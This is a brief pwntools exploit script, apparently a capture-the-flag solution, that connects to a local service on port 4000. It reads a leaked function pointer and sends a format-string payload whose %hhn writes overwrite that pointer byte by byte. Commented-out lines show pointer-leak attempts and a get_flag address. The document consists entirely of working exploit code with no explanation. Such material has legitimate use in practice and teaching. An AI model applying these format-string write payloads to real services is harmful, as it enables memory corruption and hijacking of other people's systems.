from pwn import *

r = remote('127.0.0.1',4000)

raw_input('#')
x= r.recvuntil('?')
func_ptr =  x[-11:-1]
func_ptr = int(func_ptr , 16)

payload = ''
payload += p32(func_ptr)
payload += p32(func_ptr+1)
payload += p32(func_ptr+2)
payload += p32(func_ptr+3)
payload += '%13c%7$hhn'
payload += '%104c%8$hhn'
r.sendline(payload)
#r.sendline(p32(0x804a060)+"%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%s")
#print (r.recv())
#get_flag = 0x0804861d
#print func_ptr
#r.sendline(p32(func_ptr)+'%7$hhn')

r.interactive()
